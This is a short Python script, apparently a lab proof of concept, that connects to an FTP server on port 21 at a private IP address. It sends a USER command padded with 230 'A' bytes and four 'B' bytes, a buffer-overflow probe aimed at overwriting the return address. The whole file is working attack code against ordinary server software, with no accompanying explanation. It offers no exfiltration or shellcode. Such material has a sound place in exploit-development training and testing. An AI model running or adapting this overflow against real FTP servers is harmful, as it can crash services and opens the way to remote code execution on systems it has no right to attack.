# coding=utf-8
"""
DATE:   2021/12/7
AUTHOR: TesterCC
"""

import socket

target="172.16.12.129"
s=socket.socket()
s.connect((target,21))


buff=b"\x41"*230+b"\x42"*4
data=b"USER "+buff+b"\r\n"
s.send(data)
s.close()